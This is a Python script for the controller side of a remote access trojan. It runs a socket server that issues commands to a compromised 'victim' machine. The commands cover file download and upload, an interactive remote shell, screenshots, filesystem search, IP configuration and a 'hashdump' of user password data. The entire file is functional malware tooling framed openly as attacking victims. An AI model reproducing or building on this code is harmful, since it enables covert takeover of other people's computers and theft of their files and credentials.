#!/usr/bin/python3
from secure_socket import Server
from sys import argv
import os

def help():
  print("""
COMMANDS :

  help                   Display this.
  download               Get a file from the victim.
  upload                 Put a file on the victim.
  shell                  Start a shell on the victim.
  ipconfig               Display the victim's IP configuration.
  screenshot             Take a screenshot from the victim's screen.
  search   [path] file   Find the location of a file in a directory, defaults to root directory.
  hashdump               Dump the sensitive data about users and passwords.
  exit                   Let the victim go.
""")

def ipconfig(victim):
  victim.send('ip')
  print(victim.receive())

def clear():
  os.system('cls' if os.name == 'nt' else 'clear')

def search(victim, filename, path):
  victim.send('search')
  victim.send(' '.join([filename,path]))
  result = (victim.receive())
  if result == "":
    print("File not found")
  else:
    print(result)

def screenshot(victim,filename):
  victim.send('screenshot')
  victim.send(filename)
  victim.receive_file()

def hashdump(victim):
  victim.send('hashdump')
  print(victim.receive())

def shell(victim):
  victim.send('shell')
  ps1=victim.receive()
  cmd=input(ps1)
  while cmd!='exit':
    victim.send(cmd)
    prompt_out=victim.receive()
    out="*".join(prompt_out.split('*')[1:])
    prompt=prompt_out.split('*')[0]
    if out!='':
      if out[-1]=="\n":
        print(out[:-1])
      else:
        print(out)
    cmd=input(prompt)
  victim.send('exit')

def upload(victim):
  filename_src=input('file to send => ')
  filename_dst=input('with name => ')
  if not os.path.isfile(filename_src):
    print('File not found.')
    return
  victim.send('upload')
  victim.send_file(filename_src, filename_dst)
  print('done.')

def download(victim):
  victim.send('download')
  filename_src=input('file to get => ')
  filename_dst=input('new name => ')
  victim.send(f"{filename_src}*{filename_dst}")
  ret=victim.receive()
  print(ret)
  if ret!='File not found.':
    victim.receive_file()

def run_command(server, cmd):
  command=cmd.split(" ")[0]
  match command:
    case 'help':
      help()
    case 'download':
      download(server)
    case 'upload':
      upload(server)
    case 'shell':
      shell(server)
    case 'ipconfig':
      ipconfig(server)
    case 'screenshot':
      check = cmd.split(" ")
      while '' in check:
        check.remove('')
      if len(check) ==1:
        filename = "default"
      else:
        filename = check[1]
      screenshot(server,filename)
    case  'clear':
      clear()
    case 'cls':
      clear()
    case 'search':
      check = cmd.split(" ")
      if len(check) ==2 and not "" in check:
        name = check[1]
        if os.name =='nt':
          path = 'C:\\'
        else:
          path= "/"
        search(server,name,path)
      elif len(check) ==3 and not "" in check :
        path = check[1]
        name = check[2]
        search(server,name,path)
      else:
        print("search file [path] Find the location of a file in a directory, defaults to root directory.")
    case 'hashdump':
      hashdump(server)
    case '':
      pass
    case 'exit':
      return False
    case _:
      print(f"Unknown command : {command}")
  return True

if __name__ == "__main__":
  try:
    port=int(argv[1])
    if port<1025 or port>65535:
      port=62832
  except:
    port=62832
    
  server=Server(run_command, port=port)
  try:
    server.run()
  except KeyboardInterrupt:
    print("\r Server stopped.")
  finally:
    server.stop()
